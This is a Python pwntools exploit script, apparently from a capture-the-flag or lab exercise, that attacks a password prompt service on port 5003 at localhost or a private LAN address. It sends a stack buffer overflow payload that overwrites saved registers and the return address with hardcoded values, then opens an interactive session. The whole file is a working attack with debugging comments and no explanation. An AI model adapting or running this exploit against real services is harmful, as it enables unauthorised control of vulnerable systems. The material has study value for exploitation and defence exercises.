#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
from pwn import *
from struct import pack, unpack

# ebp
MAGIC_EBP = 0xffffcf88 #works!
#MAGIC_EBP = 0xffffcf0c

# padding
MAGIC_LENGTH = 16*3

# retval
MAGIC_RETVAL = 0x3030383D #works!
MAGIC_RETVAL = 0x30303840

if "remote" in sys.argv[1:]:
    conn = remote("192.168.40.51", 5003) 
else:
    conn = remote("localhost", 5003) 

recieved = conn.recvuntil("Password: ")
log.info("Recieved password prompt")
log.info("Sending payload")

# gdb b * 0x30303869
# patch
# sigpipe
MAGIC_EBX = 0x4 #0x3
MAGIC_ESI = 0x4
MAGIC_EDI = 0xffffcf60
#MAGIC_EBP#ebp 0xffffcf88
#gdb-multiarch

payload = "A" * MAGIC_LENGTH + str(p32(MAGIC_RETVAL)) + str(p32(MAGIC_EBP)) # wrong. need to move ebp before 2
payload = "A" * 40 + str(p32(MAGIC_RETVAL)) + str(p32(MAGIC_EBP)) 
payload = "A" * 32 + str(p32(MAGIC_EBX)) + str(p32(MAGIC_ESI)) + str(p32(MAGIC_EDI)) + str(p32(MAGIC_EBP)) + str(p32(MAGIC_RETVAL))

print(payload)

conn.sendline(payload)
conn.interactive()
